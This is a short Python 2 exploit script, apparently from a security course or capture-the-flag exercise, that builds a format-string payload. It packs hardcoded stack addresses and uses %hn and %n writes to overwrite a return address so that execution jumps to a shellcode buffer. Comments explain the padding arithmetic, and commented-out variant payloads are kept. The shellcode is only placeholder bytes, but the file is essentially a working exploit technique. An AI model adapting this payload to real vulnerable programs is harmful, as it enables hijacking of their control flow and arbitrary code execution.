from struct import pack
#from shellcode import shellcode

shellcode = "\x69" * 23
padding = "\x90" * 1
takeoff = pack("<I", 0xbffeb09c) # Address of esp
offset  = pack("<I", 0xbffeb09e)  # Address of esp

#print "\xb4\xb0\xfe\xbf" + shellcode + padding + takeoff + offset + "%49113c.%4$hn%45231c.%5$hn"
print shellcode + padding + takeoff + offset + "%49117c.%4$hn%0c.%5$hn"
#print shellcode + padding + takeoff + offset + "%105c.%4$hn%105c.%5$hn"
# in this case, beginning of buf (aka shellcode) is at 0xbffeb0b0
print "\x9c\xb0\xfe\xbf%10$n"
# total is 23 + 1 + 4 + 4 = 32. so, to write bffe we add 49150 - 32 - 1 (for the period) bytes.
# then, to write b0b0 we add 45232 - 1 (for the period) bytes.

# the idea is to write the first int as hex to the top half of the word and second int to the bottom
# such that the final built address points to the location of shellcode. this word is located at $esp
# just before printf rets.
